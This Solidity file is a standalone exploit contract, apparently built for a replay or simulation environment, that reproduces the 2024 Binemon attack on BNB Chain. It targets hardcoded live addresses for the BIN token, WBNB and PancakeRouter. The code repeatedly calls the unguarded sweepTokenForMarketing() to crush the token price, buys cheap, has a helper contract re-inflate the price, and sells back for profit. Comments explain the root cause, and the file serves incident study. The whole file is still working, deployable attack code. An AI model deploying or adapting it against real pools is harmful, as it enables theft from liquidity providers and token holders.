// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-03-Binemon).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (`ContractTest`, attacker = address(this)) — there is no standalone attack
// contract to deploy. This is a faithful, self-contained copy of that inline
// attack (testExploit + TOKENTOWBNB + WBNBTOTOKEN), compiled inside the
// registry forge project. Logic and constants are copied verbatim from
// test/Binemon_exp.sol.
//
// The test's `vm.startPrank(otherUser)` re-inflation leg (Phase C: a second
// account buying 10 WBNB worth of BIN, which it never sells back) is a
// distinct on-chain identity. We reproduce it faithfully with a separate
// `BinemonOtherUserHelper` contract (deployed via `helperContracts`, seeded
// with its own 10 WBNB via `setup`) that performs ONLY that one buy and keeps
// its BIN — mirroring the test exactly instead of merging the leg into the
// attacker's own balance (which would let the attacker sell otherUser's BIN
// too and overstate profit).
//
// Root cause: Binemon.sweepTokenForMarketing() is public/unguarded and
// market-sells a fixed, known amount of the contract's own accrued BIN with
// amountOutMin = 0 — a free, sandwichable price-manipulation lever.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IBIN is IERC20 {
    function sweepTokenForMarketing() external;
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external;
}

// Simulates the test's `vm.startPrank(otherUser)` re-inflation buyer: an
// independent account that buys BIN with WBNB and never sells it back. Seeded
// with 10 WBNB via `setup.dealToken` before the attacker's run() executes.
contract BinemonOtherUserHelper {
    IBIN constant BIN = IBIN(0xe56842Ed550Ff2794F010738554db45E60730371);
    IERC20 constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IPancakeRouter constant ROUTER = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    function buy() external {
        WBNB.approve(address(ROUTER), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(BIN);
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}

contract BinemonDrain {
    IBIN constant BIN = IBIN(0xe56842Ed550Ff2794F010738554db45E60730371);
    IERC20 constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IPancakeRouter constant ROUTER = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    uint256 constant MARKETING_PILE_FLOOR = 1_000_000_000_000_000_000_000_000; // 1e24 = 1,000,000 BIN

    BinemonOtherUserHelper public immutable otherUser;

    constructor(address otherUser_) {
        otherUser = BinemonOtherUserHelper(otherUser_);
    }

    function run() external {
        WBNB.approve(address(ROUTER), type(uint256).max);
        BIN.approve(address(ROUTER), type(uint256).max);

        // Phase A: fire every permissionless sweep the contract's BIN pile can
        // fund. Each call dumps a fixed 1,000,000 BIN into the pair for free,
        // crushing the price ahead of the attacker's buy.
        while (BIN.balanceOf(address(BIN)) > MARKETING_PILE_FLOOR) {
            BIN.sweepTokenForMarketing();
        }

        // Phase B: buy BIN cheap at the depressed price with the attacker's
        // own 1 WBNB (funded via `setup`).
        WBNBTOTOKEN();

        // Phase C: the independent otherUser buys 10 WBNB worth of BIN,
        // re-inflating the price. otherUser keeps its BIN (never sold back),
        // matching the test's vm.prank(otherUser) leg exactly.
        otherUser.buy();

        // Phase D: sell the attacker's own BIN back into the now-richer pair
        // at the inflated price.
        TOKENTOWBNB();
    }

    function TOKENTOWBNB() internal {
        address[] memory path = new address[](2);
        path[0] = address(BIN);
        path[1] = address(WBNB);
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            BIN.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    function WBNBTOTOKEN() internal {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(BIN);
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
